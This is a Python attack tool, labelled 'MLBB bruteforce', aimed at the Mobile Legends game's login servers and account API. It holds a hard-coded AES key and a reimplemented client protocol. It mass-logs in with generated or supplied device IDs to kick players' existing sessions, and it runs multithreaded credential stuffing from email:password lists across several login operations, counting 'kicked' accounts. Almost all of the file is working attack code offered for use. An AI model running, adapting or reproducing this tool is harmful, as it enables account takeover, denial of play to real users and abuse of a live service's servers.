import socket, struct, zstandard as zstd, zlib, time, hashlib, threading, sys, os, json, uuid, argparse, random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from Crypto.Cipher import AES

AES_KEY = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
AES_IV = b'\x00' * 16

CLIENT_VERSION = '2.1.88.1202.1'
CHANNEL = 'and_usa'

GLOBAL_SERVERS = [
    ('global-login.ml.youngjoygame.com', 30021),
    ('login.ml.youngjoygame.com', 30021),
    ('login-mlus.mproject.skystone.games', 30021),
]

ACCOUNT_API = "https://accountmtapi.mobilelegends.com/"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

stats = {'success': 0, 'failed': 0, 'timeout': 0, 'total': 0, 'errors': 0, 'kicked': 0}
stats_lock = threading.Lock()

def _varint(val):
    buf = bytearray()
    while val >= 0x80:
        buf.append((val & 0x7F) | 0x80)
        val >>= 7
    buf.append(val & 0x7F)
    return bytes(buf)

def _read_varint(data, offset):
    val = 0; shift = 0
    while offset < len(data):
        b = data[offset]
        val |= (b & 0x7F) << shift
        shift += 7; offset += 1
        if not (b & 0x80): break
    return val, offset

def build_sdp(data):
    buf = bytearray([0x70])
    for tag in sorted(data.keys()):
        val = data[tag]
        if isinstance(val, str):
            encoded = val.encode('utf-8')
            buf.append(0x40 | (tag if tag < 15 else 0x0f))
            if tag >= 15: buf.extend(_varint(tag))
            buf.extend(_varint(len(encoded))); buf.extend(encoded)
        elif isinstance(val, bytes):
            buf.append(0x40 | (tag if tag < 15 else 0x0f))
            if tag >= 15: buf.extend(_varint(tag))
            buf.extend(_varint(len(val))); buf.extend(val)
        elif isinstance(val, int):
            dtype = 0 if val >= 0 else 1
            buf.append(dtype << 4 | (tag if tag < 15 else 0x0f))
            if tag >= 15: buf.extend(_varint(tag))
            buf.extend(_varint(abs(val)))
    buf.append(0x80)
    return bytes(buf)

def _unpack_field(data, offset):
    header = data[offset]; tag = header & 0x0F; dtype = header >> 4
    offset += 1
    if tag == 15: tag, offset = _read_varint(data, offset)
    if dtype in (0, 1):  # INTEGER_POSITIVE / INTEGER_NEGATIVE
        val, offset = _read_varint(data, offset)
        return tag, (-val if dtype == 1 else val), offset
    elif dtype == 2:  # FLOAT
        length, offset = _read_varint(data, offset)
        raw = data[offset:offset+length]; offset += length
        return tag, struct.unpack('<f', raw)[0], offset
    elif dtype == 3:  # DOUBLE
        length, offset = _read_varint(data, offset)
        raw = data[offset:offset+length]; offset += length
        return tag, struct.unpack('<d', raw)[0], offset
    elif dtype == 4:  # STRING
        length, offset = _read_varint(data, offset)
        raw = data[offset:offset+length]; offset += length
        try: return tag, raw.decode('utf-8'), offset
        except: return tag, raw, offset
    elif dtype == 5:  # LIST
        length, offset = _read_varint(data, offset)
        items = []
        for _ in range(length):
            _, item, offset = _unpack_field(data, offset)
            items.append(item)
        return tag, items, offset
    elif dtype == 6:  # DICT
        length, offset = _read_varint(data, offset)
        d = {}
        for _ in range(length):
            _, k, offset = _unpack_field(data, offset)
            _, v, offset = _unpack_field(data, offset)
            d[k] = v
        return tag, d, offset
    elif dtype == 7:  # STRUCT_BEGIN
        sub = {}
        while offset < len(data):
            if data[offset] >> 4 == 8: offset += 1; break  # STRUCT_END
            st, sv, offset = _unpack_field(data, offset)
            sub[st] = sv
        return tag, sub, offset
    return tag, None, offset

def parse_sdp(data):
    result = {}
    if not data: return result
    offset = 0
    if data[0] >> 4 == 7: offset = 1  # skip outer STRUCT_BEGIN
    while offset < len(data):
        header = data[offset]
        if header >> 4 == 8: offset += 1; break  # STRUCT_END
        tag, val, offset = _unpack_field(data, offset)
        result[tag] = val
    return result

def decompress(body, ctype):
    if ctype == 16: return zstd.decompress(body)
    if ctype == 1: return zlib.decompress(body)
    if ctype == 2:
        c = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
        return c.decrypt(body).rstrip(b'\x00')
    if ctype == 18:
        c = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
        return zstd.decompress(c.decrypt(body).rstrip(b'\x00'))
    return body

def send_sdp(sock, packet_id, seq, inner_bytes):
    outer = build_sdp({0: packet_id, 1: seq, 5: inner_bytes})
    buf = zstd.compress(outer)
    flags = (len(buf) + 4) | (16 << 24)
    sock.send(flags.to_bytes(4, 'big') + buf)

def recv_sdp(sock):
    q = b''
    while len(q) < 4:
        d = sock.recv(4096)
        if not d: return None, None
        q += d
    fr = struct.unpack('>I', q[:4])[0]
    size, ctype = fr & 0xFFFFFF, fr >> 24
    while len(q) < size:
        d = sock.recv(4096)
        if not d: break
        q += d
    decoded = decompress(q[4:size], ctype)
    outer_f = parse_sdp(decoded)
    pid = outer_f.get(0)
    raw = outer_f.get(6) or outer_f.get(5)
    if isinstance(raw, (bytes, str)):
        buf = raw if isinstance(raw, bytes) else raw.encode()
        return pid, parse_sdp(buf)
    return pid, None

def tcp_login(device_id, host, port, timeout=10):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        parts = device_id.split('_')
        if len(parts) >= 4:
            imei, aid, adv = parts[1], parts[2], '_'.join(parts[3:])
        elif len(parts) == 3:
            mid = parts[1]; imei = mid[:32]; aid = mid[32:48] if len(mid) >= 48 else ''; adv = mid[48:] if len(mid) > 48 else parts[2]
        elif len(parts) == 2:
            info = parts[1]; imei = info[:32]; aid = info[32:48] if len(info) >= 48 else ''; adv = info[48:] if len(info) > 48 else ''
        else: imei, aid, adv = device_id, '', ''
        auth_str = f'gps_adid={adv}&android_id={aid}&device_unique_id={imei}'
        inner = build_sdp({0: device_id, 1: auth_str, 2: CLIENT_VERSION, 3: CHANNEL, 4: 'en'})
        outer = build_sdp({0: 1, 1: 1, 5: inner})
        compressed = zstd.compress(outer)
        flags = (len(compressed) + 4) | (16 << 24)
        s.send(flags.to_bytes(4, 'big') + compressed)
        q = b''
        while len(q) < 4:
            d = s.recv(4096)
            if not d: return None, 'no data'
            q += d
        fr = struct.unpack('>I', q[:4])[0]
        size, ctype = fr & 0xFFFFFF, fr >> 24
        while len(q) < size:
            d = s.recv(4096)
            if not d: break
            q += d
        decoded = decompress(q[4:size], ctype)
        outer_f = parse_sdp(decoded)
        pid = outer_f.get(0)
        tag5 = outer_f.get(5)
        tag6 = outer_f.get(6)
        # tag 5 or 6 = inner SDP bytes (success) OR error code (int)
        raw = tag6 if isinstance(tag6, (bytes, str)) else (tag5 if isinstance(tag5, (bytes, str)) else None)
        err = tag5 if isinstance(tag5, int) else (tag6 if isinstance(tag6, int) else None)
        if raw is not None:
            inner_f = parse_sdp(raw if isinstance(raw, bytes) else raw.encode())
            aid_val = inner_f.get(0)
            sk = inner_f.get(1)
            zid = inner_f.get(2)
            if isinstance(zid, dict): zid = zid.get(0, 0)
            elif isinstance(zid, list): zid = zid[0] if zid else 0
            return True, {'account_id': aid_val, 'session_key': str(sk) if sk else '', 'zone_id': zid, 'creation_ts': inner_f.get(19, 0), 'error_code': err, 'packet_id': pid}
        return False, {'error_code': err, 'packet_id': pid}
    except socket.timeout: return None, 'timeout'
    except Exception as e: return None, str(e)
    finally:
        try: s.close()
        except: pass

def tcp_kick_account(device_id, host, port, timeout=10):
    """Full TCP kick: login → get game server → game handshake → kicks old session."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        seq = 1
        # ---- Step 1: Login (packet 1) ----
        parts = device_id.split('_')
        if len(parts) >= 4: imei, aid, adv = parts[1], parts[2], '_'.join(parts[3:])
        elif len(parts) == 3: mid = parts[1]; imei = mid[:32]; aid = mid[32:48] if len(mid) >= 48 else ''; adv = mid[48:] if len(mid) > 48 else parts[2]
        elif len(parts) == 2: info = parts[1]; imei = info[:32]; aid = info[32:48] if len(info) >= 48 else ''; adv = info[48:] if len(info) > 48 else ''
        else: imei, aid, adv = device_id, '', ''
        auth_str = f'gps_adid={adv}&android_id={aid}&device_unique_id={imei}'
        inner = build_sdp({0: device_id, 1: auth_str, 2: CLIENT_VERSION, 3: CHANNEL, 4: 'en'})
        send_sdp(s, 1, seq, inner); seq += 1
        pid, inner_f = recv_sdp(s)
        if pid != 2 or not inner_f:
            return False, {'error': 'login failed', 'pid': pid}
        account_id = inner_f.get(0)
        session_key = inner_f.get(1)
        zid = inner_f.get(2)
        if isinstance(zid, dict): zid = zid.get(0, 0)
        elif isinstance(zid, list): zid = zid[0] if zid else 0
        if not account_id or not session_key:
            return False, {'error': 'no account data'}
        # ---- Step 2: Get game server (packet 5) ----
        gs_inner = build_sdp({0: account_id, 1: session_key, 2: CLIENT_VERSION, 5: zid, 6: CHANNEL})
        send_sdp(s, 5, seq, gs_inner); seq += 1
        pid, gs_f = recv_sdp(s)
        if pid != 6 or not gs_f:
            return False, {'error': 'no game server', 'pid': pid}
        game_server = gs_f.get(1, '')
        if ':' not in str(game_server):
            return False, {'error': f'bad game server: {game_server}'}
        gs_host, gs_port = str(game_server).split(':')
        gs_port = int(gs_port)
        s.close()  # done with login server
        # ---- Step 3: Connect to game server & send handshake ----
        gs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        gs.settimeout(timeout)
        gs.connect((gs_host, gs_port))
        hs = build_sdp({0: account_id, 1: session_key, 2: zid, 4: CLIENT_VERSION, 13: CHANNEL, 15: device_id})
        send_sdp(gs, 10001, 1, hs)
        hs2 = build_sdp({0: 0, 2: 2})
        send_sdp(gs, 10101, 2, hs2)
        kicked = False
        for _ in range(10):
            pid, _ = recv_sdp(gs)
            if pid == 10002: kicked = True; break
            if pid is None or pid == -1: break
        gs.close()
        if kicked:
            return True, {'account_id': account_id, 'session_key': session_key, 'zone_id': zid, 'game_server': game_server}
        return True, {'account_id': account_id, 'session_key': session_key, 'zone_id': zid, 'game_server': game_server, 'warning': 'connected no 10002'}
    except socket.timeout: return None, 'timeout'
    except Exception as e: return None, str(e)
    finally:
        try: s.close()
        except: pass

def http_login(email, password, captcha='', op='new_login_pwd'):
    try:
        from curl_cffi import requests as cr
    except ImportError:
        import requests as cr
    md5pwd = hashlib.md5(password.encode()).hexdigest().lower()
    params = {'account': email, 'md5pwd': md5pwd}
    if captcha: params['e_captcha'] = captcha
    parts = []
    for k in sorted(params.keys()):
        v = params[k]
        if v is not None: parts.append(f"{k}={v}")
    sign = hashlib.md5(('&'.join(parts) + f'&op={op}').encode()).hexdigest().lower()
    body = {'op': op, 'sign': sign, 'params': params, 'lang': 'en'}
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Origin': 'https://mtacc.mobilelegends.com',
        'Referer': 'https://mtacc.mobilelegends.com/',
        'User-Agent': USER_AGENT,
    }
    s = cr.Session() if 'curl_cffi' in dir() else requests.Session()
    s.trust_env = False; s.proxies = {}
    try:
        resp = s.request('PUT', ACCOUNT_API, json=body, headers=headers, timeout=20)
        data = resp.json()
        code = data.get('code')
        if code == 0 and data.get('data'):
            ld = data['data']
            return True, {'guid': ld.get('guid'), 'session': ld.get('session'), 'code': 0}
        return False, {'code': code, 'message': data.get('message', ''), 'op': op}
    except Exception as e: return None, str(e)
    finally: s.close()

def attempt_tcp(device_id, servers):
    for h, p in servers:
        st, r = tcp_kick_account(device_id, h, p)
        if st is not None: return st, r
    return None, 'all servers failed'

def attempt_http(account_line, captcha=''):
    if ':' not in account_line: return None, 'bad format'
    email, pw = account_line.split(':', 1)
    # Try without captcha first (legacy ops)
    for op in ['login', 'login_captcha', 'sdk_login']:
        st, r = http_login(email, pw, '', op)
        if st is True: return st, r
        if r and isinstance(r, dict) and r.get('code') == 0: return st, r
    # Try with captcha if available
    if captcha:
        st, r = http_login(email, pw, captcha, 'new_login_pwd')
        if st is True: return st, r
    return False, {'code': -1, 'message': 'all ops failed'}

def tcp_worker(pool, servers, delay, wid):
    while True:
        with stats_lock:
            if not pool: break
            did = pool.pop(0) if pool else None
        if not did: break
        st, r = attempt_tcp(did, servers)
        with stats_lock:
            stats['total'] += 1
            if st is True:
                stats['kicked'] += 1
                acc = r.get('account_id','?')
                zid = r.get('zone_id','?')
                gs = r.get('game_server','?')
                print(f"[W{wid}] KICKED  did={did[:35]}...  acc={acc}  zone={zid}  gs={gs}")
            elif st is False:
                ec = r.get('error', r.get('error_code', '?'))
                print(f"[W{wid}] FAIL  did={did[:40]}...  err={ec}")
                stats['failed'] += 1
            elif st is None:
                if r == 'timeout': stats['timeout'] += 1
                else: stats['errors'] += 1
        if delay > 0: time.sleep(delay)

def http_worker(pool, servers, captcha, delay, wid):
    while True:
        with stats_lock:
            if not pool: break
            line = pool.pop(0) if pool else None
        if not line: break
        st, r = attempt_http(line, captcha)
        with stats_lock:
            stats['total'] += 1
            if st is True:
                stats['kicked'] += 1
                email = line.split(':')[0]
                print(f"[W{wid}] KICKED  {email}  guid={r.get('guid','?')[:16]}")
            elif st is False:
                stats['failed'] += 1
            elif st is None:
                if r == 'timeout': stats['timeout'] += 1
                else: stats['errors'] += 1
        if delay > 0: time.sleep(delay)

def load_lines(path):
    items = []
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'): items.append(line)
    return items

def print_stats(stop_event):
    start = time.time()
    while not stop_event.is_set():
        time.sleep(5)
        elapsed = time.time() - start
        with stats_lock:
            s = stats
        rate = s['total'] / elapsed if elapsed > 0 else 0
        print(f"\n[STATS] T:{s['total']} KICK:{s['kicked']} FAIL:{s['failed']} TO:{s['timeout']} ERR:{s['errors']}  {rate:.1f}/s  {int(elapsed)}s\n")

def main():
    parser = argparse.ArgumentParser(description='MLBB bruteforce - TCP device login or HTTP account kicker')
    parser.add_argument('-m', '--mode', choices=['tcp', 'http'], default='tcp', help='tcp=device IDs, http=email:pass accounts')
    parser.add_argument('-d', '--device', help='Single device ID (TCP mode)')
    parser.add_argument('-f', '--file', help='File with device IDs (TCP) or email:pass (HTTP)')
    parser.add_argument('-n', '--count', type=int, default=10, help='Generate N device IDs (TCP mode, default)')
    parser.add_argument('-a', '--accounts', help='Accounts file (email:pass) for HTTP mode')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Thread count')
    parser.add_argument('--delay', type=float, default=0, help='Delay between attempts (sec)')
    parser.add_argument('--server', help='Custom TCP server (host:port)')
    parser.add_argument('--global-servers', action='store_true', help='Try all global TCP servers (default: first server only)')
    parser.add_argument('--loop', action='store_true', default=False, help='Loop continuously')
    parser.add_argument('--max-attempts', type=int, default=0, help='Max attempts (0=unlimited)')
    parser.add_argument('--max', type=int, default=0, help='Same as --max-attempts')
    parser.add_argument('--captcha', help='Captcha token for HTTP login')
    args = parser.parse_args()
    if args.max and not args.max_attempts: args.max_attempts = args.max

    mode = args.mode

    if mode == 'tcp':
        pool = []
        if args.device: pool.append(args.device)
        elif args.file: pool = load_lines(args.file)
        else:
            base = hashlib.md5(b'and_bf').hexdigest()
            for i in range(args.count):
                uid = str(uuid.uuid4())
                pool.append(f"and_{base}{uid[:16]}-{uid}")
        if not pool: print("[!] No device IDs"); return

        servers = []
        if args.server:
            if ':' in args.server: h, p = args.server.split(':'); servers.append((h, int(p)))
            else: servers.append((args.server, 30021))
        elif args.global_servers: servers = GLOBAL_SERVERS.copy()
        else: servers = [GLOBAL_SERVERS[0]]

        print(f"{'='*60}\n  MLBB TCP DEVICE BRUTEFORCE\n{'='*60}")
        print(f"  Devices:  {len(pool)}  Servers: {', '.join(f'{h}:{p}' for h,p in servers)}")
        print(f"  Threads:  {args.threads}  Delay: {args.delay}s  Loop: {'yes' if args.loop else 'no'}")
        print(f"{'='*60}\n")

        stop = threading.Event()
        threading.Thread(target=print_stats, args=(stop,), daemon=True).start()
        attempt_count, loop_count, start_time = 0, 0, time.time()
        while True:
            if args.max_attempts > 0:
                rem = args.max_attempts - attempt_count
                if rem <= 0: break
            p = pool.copy()
            if args.loop: random.shuffle(p)
            if args.max_attempts > 0 and len(p) > rem: p = p[:rem]
            if not p: break
            loop_count += 1
            if loop_count > 1: print(f"\n[LOOP {loop_count}]\n")
            with ThreadPoolExecutor(max_workers=args.threads) as ex:
                fs = [ex.submit(tcp_worker, [did], servers, args.delay, i % args.threads) for i, did in enumerate(p)]
                for f in as_completed(fs): attempt_count += 1
            if not args.loop: break
        stop.set(); time.sleep(0.5)
        elapsed = time.time() - start_time
        with stats_lock:
            s = stats
            print(f"\n{'='*60}\n  FINAL  T:{s['total']} KICK:{s['kicked']} FAIL:{s['failed']} TO:{s['timeout']} ERR:{s['errors']}  {s['total']/elapsed:.1f}/s  {int(elapsed)}s\n{'='*60}")

    else:
        pool = []
        if args.accounts: pool = load_lines(args.accounts)
        elif args.file: pool = load_lines(args.file)
        elif args.device: pool.append(args.device)
        else: print("[!] No accounts provided (use -a or --accounts)");
        if not pool: return

        print(f"{'='*60}\n  MLBB HTTP ACCOUNT KICKER\n{'='*60}")
        print(f"  Accounts: {len(pool)}  Threads: {args.threads}  Delay: {args.delay}s")
        print(f"  Captcha:  {'provided' if args.captcha else 'NONE (tries legacy ops)'}")
        print(f"{'='*60}\n")

        stop = threading.Event()
        threading.Thread(target=print_stats, args=(stop,), daemon=True).start()
        attempt_count, loop_count, start_time = 0, 0, time.time()
        while True:
            if args.max_attempts > 0:
                rem = args.max_attempts - attempt_count
                if rem <= 0: break
            p = pool.copy()
            random.shuffle(p)
            if args.max_attempts > 0 and len(p) > rem: p = p[:rem]
            if not p: break
            loop_count += 1
            if loop_count > 1: print(f"\n[LOOP {loop_count}]\n")
            with ThreadPoolExecutor(max_workers=args.threads) as ex:
                fs = [ex.submit(http_worker, [line], [], args.captcha or '', args.delay, i % args.threads) for i, line in enumerate(p)]
                for f in as_completed(fs): attempt_count += 1
            if not args.loop: break
        stop.set(); time.sleep(0.5)
        elapsed = time.time() - start_time
        with stats_lock:
            s = stats
            print(f"\n{'='*60}\n  FINAL  T:{s['total']} KICK:{s['kicked']} FAIL:{s['failed']} TO:{s['timeout']} ERR:{s['errors']}  {s['total']/elapsed:.1f}/s  {int(elapsed)}s\n{'='*60}")

if __name__ == '__main__':
    main()
